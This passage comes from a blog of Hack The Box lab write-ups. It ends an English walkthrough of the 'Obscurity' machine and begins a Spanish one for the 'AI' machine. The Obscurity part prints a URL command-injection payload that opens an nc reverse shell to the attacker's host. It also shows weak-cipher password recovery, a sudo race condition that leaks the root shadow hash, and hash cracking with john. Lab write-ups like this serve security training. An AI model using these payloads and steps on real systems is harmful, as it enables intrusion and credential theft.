            mime <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
            <span style="color:#66d9ef">with</span> open(errorPage, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
                data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
            status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;500&#34;</span>
        <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;body&#34;</span>: data, <span style="color:#e6db74">&#34;mime&#34;</span>: mime, <span style="color:#e6db74">&#34;status&#34;</span>: status}
</code></pre></div><p>By doing some code-analysis, is possible to see that the function <code>serveDoc()</code> is vulnerable to a command injection in its line <code>exec(info.format(path)) # This is how you do string formatting, right?</code> this is because it&rsquo;s making use of <a href="https://docs.python.org/2.0/ref/exec.html">exec</a> which is not even being sanitized, so in other words&hellip;there is being used a function which executes stuff at OS level while not sanitized, so this is our RCE :)</p>
<p>Pst: The hyperlink against the doc of <code>exec</code> points to 2.0 because when I did this machine, python 2.x was still alive, and then I just went to read of exec on that version.</p>
<h2 id="rce">RCE</h2>
<p>Knowing that the webserver is vulnerable to a command injection, I started to do some trial/error in differents ways, after some time and a little POC I ended getting a reverse shell by executing:</p>
<pre><code class="language-console" data-lang="console">http://10.10.10.168:8080/';os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f');'
</code></pre>
    <img src="/images/htb/obscurity/1-rce.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="user">user</h2>
<p>Once inside a reverse, I start doing some normal linux enumeration, after a few minutes I see there is a user called <code>robert</code> and I list the contents of it&rsquo;s home:</p>
<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ ls -la /home/robert
total 60
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
drwxr-xr-x 3 root   root   4096 Sep 24 22:09 ..
lrwxrwxrwx 1 robert robert    9 Sep 28 23:28 .bash_history -&gt; /dev/null
-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
drwx------ 2 robert robert 4096 Oct  5 13:09 BetterSSH
drwx------ 2 robert robert 4096 Oct  3 16:02 .cache
-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt
drwxr-x--- 3 robert robert 4096 Dec  2 09:53 .config
drwx------ 3 robert robert 4096 Oct  3 22:42 .gnupg
drwxrwxr-x 3 robert robert 4096 Oct  3 16:34 .local
-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt
-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt
</code></pre><p>So, we need to compromise <code>robert</code> and in it&rsquo;s home lies the path&hellip;in the ls is possible to see some interesting files/directorys: <code>BetterSSH</code>, <code>SuperSecureCrypt.py</code>, <code>out.txt</code>, <code>check.txt</code> and <code>passwordreminder.txt</code>, we start by checking the content of everything:</p>
<p>First, the directory BetterSSH looks interesting, but we can&rsquo;t see what&rsquo;s inside, so let&rsquo;s take note of this as might come handy later.</p>
<p><code>check.txt</code> has an interesting message:</p>
<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct! 
</code></pre><p><code>out.txt</code> looks like a ciphered message&hellip;(and from the content of <code>check.txt</code> we know they are related)</p>
<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file out.txt
out.txt: UTF-8 Unicode text, with NEL line terminators
www-data@obscure:/home/robert$ cat out.txt
¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
</code></pre><p>Same with <code>passwordreminder.txt</code>:</p>
<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file passwordreminder.txt
passwordreminder.txt: UTF-8 Unicode text, with no line terminators
www-data@obscure:/home/robert$ cat passwordreminder.txt 
´ÑÈÌÉàÙÁÑé¯·¿k
</code></pre><p>And finally, the code of <code>SuperSecureCrypt.py</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> argparse

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(text, key):
    keylen <span style="color:#f92672">=</span> len(key)
    keyPos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    encrypted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> text:
        keyChr <span style="color:#f92672">=</span> key[keyPos]
        newChr <span style="color:#f92672">=</span> ord(x)
        newChr <span style="color:#f92672">=</span> chr((newChr <span style="color:#f92672">+</span> ord(keyChr)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">255</span>)
        encrypted <span style="color:#f92672">+=</span> newChr
        keyPos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
        keyPos <span style="color:#f92672">=</span> keyPos <span style="color:#f92672">%</span> keylen
    <span style="color:#66d9ef">return</span> encrypted

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(text, key):
    keylen <span style="color:#f92672">=</span> len(key)
    keyPos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    decrypted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> text:
        keyChr <span style="color:#f92672">=</span> key[keyPos]
        newChr <span style="color:#f92672">=</span> ord(x)
        newChr <span style="color:#f92672">=</span> chr((newChr <span style="color:#f92672">-</span> ord(keyChr)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">255</span>)
        decrypted <span style="color:#f92672">+=</span> newChr
        keyPos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
        keyPos <span style="color:#f92672">=</span> keyPos <span style="color:#f92672">%</span> keylen
    <span style="color:#66d9ef">return</span> decrypted

parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Encrypt with 0bscura</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s encryption algorithm&#39;</span>)

parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-i&#39;</span>,
                    metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;InFile&#39;</span>,
                    type<span style="color:#f92672">=</span>str,
                    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;The file to read&#39;</span>,
                    required<span style="color:#f92672">=</span>False)

parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-o&#39;</span>,
                    metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;OutFile&#39;</span>,
                    type<span style="color:#f92672">=</span>str,
                    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Where to output the encrypted/decrypted file&#39;</span>,
                    required<span style="color:#f92672">=</span>False)

parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-k&#39;</span>,
                    metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Key&#39;</span>,
                    type<span style="color:#f92672">=</span>str,
                    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Key to use&#39;</span>,
                    required<span style="color:#f92672">=</span>False)

parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-d&#39;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_true&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Decrypt mode&#39;</span>)

args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()

banner <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;################################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
banner<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;#           BEGINNING          #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
banner<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;#    SUPER SECURE ENCRYPTOR    #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
banner<span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;################################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  ############################</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  #        FILE MODE         #</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
banner <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;  ############################&#34;</span>
<span style="color:#66d9ef">print</span>(banner)
<span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>o <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>k <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> args<span style="color:#f92672">.</span>i <span style="color:#f92672">==</span> None:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Missing args&#34;</span>)
<span style="color:#66d9ef">else</span>:
    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>d:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Opening file {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>i, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
            data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()

        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Decrypting...&#34;</span>)
        decrypted <span style="color:#f92672">=</span> decrypt(data, args<span style="color:#f92672">.</span>k)

        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Writing to {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>o, <span style="color:#e6db74">&#39;w&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
            f<span style="color:#f92672">.</span>write(decrypted)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Opening file {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>i))
        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>i, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
            data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()

        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Encrypting...&#34;</span>)
        encrypted <span style="color:#f92672">=</span> encrypt(data, args<span style="color:#f92672">.</span>k)

        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Writing to {0}...&#34;</span><span style="color:#f92672">.</span>format(args<span style="color:#f92672">.</span>o))
        <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>o, <span style="color:#e6db74">&#39;w&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;UTF-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
            f<span style="color:#f92672">.</span>write(encrypted)
</code></pre></div><p>By analyzing what the code does, one can see that it takes a file as input and a key and ciphers that file, is possible to observe as well we can provide a ciphered file and it&rsquo;s correspondant plain text file in decrypt mode as key, which will give back the key that was used&hellip;
Then we proceed to execute the script with <code>out.txt</code> as input and <code>check.txt</code> as the key, saving the output (the key), under tmp as <code>foobar</code>:</p>
<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k &quot;$( cat check.txt )&quot; -o /tmp/foobar -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file out.txt...
Decrypting...
Writing to /tmp/foobar...

www-data@obscure:/home/robert$ cat /tmp/foobar    
cat /tmp/foobar
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
</code></pre><p>Now, we are able to decipher <code>passwordreminder.txt</code> providing the key we got before, getting then the content of <code>passwordreminder.txt</code> and highly likely the password of the user itself:</p>
<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai' -o /tmp/pass -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to /tmp/pass...
www-data@obscure:/home/robert$ cat /tmp/pass
cat /tmp/pass
SecThruObsFTW
</code></pre><p>Now we try to do <code>su - robert</code> with the retrived password, and we are <code>robert</code> :)</p>
<pre><code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat /tmp/pass
cat /tmp/pass
SecThruObsFTW
www-data@obscure:/home/robert$ su - robert
su - robert
Password: SecThruObsFTW

robert@obscure:~$
</code></pre><h2 id="root">root</h2>
<p>From here on, is recommended to connect as robert via ssh with the password we got before as we will have a fully TTY. Once in, as we are <code>robert</code>, it&rsquo;s possible for us to see what&rsquo;s inside <code>BetterSSH</code>:</p>
<pre><code class="language-console" data-lang="console">$ ls -la BetterSSH
total 12
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 .
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 ..
-rwxr-xr-x 1 root   root   1805 Oct  5 13:09 BetterSSH.py
</code></pre><p>There is a script called <code>BetterSSH.py</code>, we check it&rsquo;s code which is:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> random<span style="color:#f92672">,</span> string
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> crypt
<span style="color:#f92672">import</span> traceback
<span style="color:#f92672">import</span> subprocess

path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, k<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))
session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;user&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;authenticated&#34;</span>: <span style="color:#ae81ff">0</span>}
<span style="color:#66d9ef">try</span>:
    session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter username: &#34;</span>)
    passW <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter password: &#34;</span>)

    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/etc/shadow&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
    data <span style="color:#f92672">=</span> [(p<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>) <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;$&#34;</span> <span style="color:#f92672">in</span> p <span style="color:#66d9ef">else</span> None) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> data]
    passwords <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> data:
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x <span style="color:#f92672">==</span> None:
            passwords<span style="color:#f92672">.</span>append(x)

    passwordFile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(p) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords]) 
    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
        f<span style="color:#f92672">.</span>write(passwordFile)
    time<span style="color:#f92672">.</span>sleep(<span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>)
    salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    realPass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords:
        <span style="color:#66d9ef">if</span> p[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> session[<span style="color:#e6db74">&#39;user&#39;</span>]:
            salt, realPass <span style="color:#f92672">=</span> p[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;$&#39;</span>)[<span style="color:#ae81ff">2</span>:]
            <span style="color:#66d9ef">break</span>

    <span style="color:#66d9ef">if</span> salt <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid user&#34;</span>)
        os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
    salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$6$&#39;</span><span style="color:#f92672">+</span>salt<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;$&#39;</span>
    realPass <span style="color:#f92672">=</span> salt <span style="color:#f92672">+</span> realPass

    hash <span style="color:#f92672">=</span> crypt<span style="color:#f92672">.</span>crypt(passW, salt)

    <span style="color:#66d9ef">if</span> hash <span style="color:#f92672">==</span> realPass:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Authed!&#34;</span>)
        session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Incorrect pass&#34;</span>)
        os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
    os<span style="color:#f92672">.</span>remove(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span>,path))
<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
    traceback<span style="color:#f92672">.</span>print_exc()
    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)

<span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
    <span style="color:#66d9ef">while</span> True:
        command <span style="color:#f92672">=</span> input(session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@Obscure$ &#34;</span>)
        cmd <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;sudo&#39;</span>, <span style="color:#e6db74">&#39;-u&#39;</span>,  session[<span style="color:#e6db74">&#39;user&#39;</span>]]
        cmd<span style="color:#f92672">.</span>extend(command<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>))
        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(cmd, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)

        o,e <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>communicate()
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Output: &#39;</span> <span style="color:#f92672">+</span> o<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Error: &#39;</span>  <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#66d9ef">if</span> len(e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span>)
</code></pre></div><p>On top of this we see that we can run with sudo (tl;dr: as root user) the mentioned script:</p>
<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
</code></pre><p>By analyzing the source code, we see that once you try to login with <code>BetterSSH</code>, there is a moment where <code>/etc/shadow</code> is open in read mode (posible due to execute <code>BetterSSH.py</code> with sudo!), and is written under <code>/tmp/SSH</code> on a file, later on the temporal <code>/etc/shadow</code> written in tmp will be deleted, this means here we have a race condition where at some moment if we try to read the contents of the temporal file generated we will be able to do it, said this, let&rsquo;s try it.</p>
<p>On one terminal, we execute <code>BetterSSH.py</code> with sudo:</p>
<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: root
Enter password: foo
Incorrect pass
</code></pre><p>And in another term, we execute a while true loop, that will be doing cat on the files under <code>/tmp/SSH</code>, and at some moment we confim the race condition we previously thought of as we have the content of <code>/etc/shadow</code> for the user root (remember the script is run with sudo):</p>
<pre><code class="language-console" data-lang="console">robert@obscure:/tmp/SSH$ while true; do cat *; done
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7
</code></pre><p>I grab that content of shadow and the one of <code>/etc/passwd</code>, run unshadow to generate a file compatible to john and crack it:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt &gt; rootkey.txt
root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# john --wordlist=/usr/share/wordlists/rockyou.txt rootkey.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
--- SNIP ---
mercedes         (root)
--- SNIP ---
Session completed
</code></pre><p>And there we have the password of root user; <code>mercedes</code> and we succesfully login as root with it :D</p>
<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ su - root
Password:
root@obscure:~# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre><p>Well, this was a really fun machine, and one that teach me a lot (specifically talking python stuff), so well I hope I can give something yousefull to you with this write up, and thanks a lot for read until the end :)</p>
<p>I will try to be making some time to do write ups of some other machines, until next time!!</p>
]]></content></item><item><title>Hack The Box - AI</title><link>https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/</link><pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/</guid><description>Resumen rápido Finalmente estoy posteando el walk-through de esta máquina, actualmente estoy preparando el OSCP, por lo que no tengo tanto tiempo para poder escribir en el momento. Al momento que rompí esta máquina, aún estaba documentando solamente vía screenshots, por lo que la fecha/hora entre algunas cosas puede diferir (le entré de nuevo para conseguir doc. más clara).
Esta fue una máquina que para el punto de entrada, es necesario subir un .</description><content type="html"><![CDATA[
    <img src="/images/htb/ai/info-card.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="resumen-rápido">Resumen rápido</h2>
<p>Finalmente estoy posteando el walk-through de esta máquina, actualmente estoy preparando el OSCP, por lo que no tengo tanto tiempo para poder escribir en el momento.
Al momento que rompí esta máquina, aún estaba documentando solamente vía screenshots, por lo que la fecha/hora entre algunas cosas puede diferir (le entré de nuevo para conseguir doc. más clara).</p>
<p>Esta fue una máquina que para el punto de entrada, es necesario subir un .wav con una inyección sql a modo de conseguir un reverso shell (el .wav es interpretado por la &ldquo;AI&rdquo;), y para el root el exploit <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html">JWDP</a>, la idea de usar una AI a modo de conseguir el punto de entrada, es original, pero siento que no sél a la implementación le faltó algo, fueronnecesarios muchos intento-error para poder dar con la SQLi necesaria, y además con los diferentes <a href="https://en.wikipedia.org/wiki/Speech_synthesis">TTS</a>, que se yo no es una máquina que sienta que realmente me haya enseñado algo nuevo del todo.</p>
<p>Bue&hellip;hora de empezar a romper un poco!</p>
<h2 id="nmap">Nmap</h2>
<p>Como siempre, arrancar enumerando ejecutando Nmap:</p>
<pre><code class="language-console" data-lang="console"># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
Nmap scan report for ai.htb (10.10.10.163)
Host is up (0.019s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello AI!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/11%OT=22%CT=1%CU=38328%PV=Y%DS=2%DC=I%G=Y%TM=5DF152
OS:AE%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=108%GCD=2%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 11 15:33:50 2019 -- 1 IP address (1 host up) scanned in 20.74 seconds
</code></pre><p>Nmap encuetra abiertos SSH y HTTP (Apache 2.4.29 es el server) abiertos.</p>
<h2 id="enumeración-web">Enumeración Web</h2>
<p>La página inicial, muestra una web con menús interactivos, uno de ellos da a un &ldquo;anuncio&rdquo; de una AI creada por la empresa (la que simula ser la web) que puede identificar audio, y para probarla se da la posibilidad de subir un .wav al server, o sea ahí ya hay una forma de subir un reverso shell.
Algo más de enumeración se lleva a cabo.</p>

    <img src="/images/htb/ai/1.1-web.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/ai/1.1-web-php-1.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/ai/1.1-web-php-2.png"  class="center"  style="border-radius: 8px;"  />



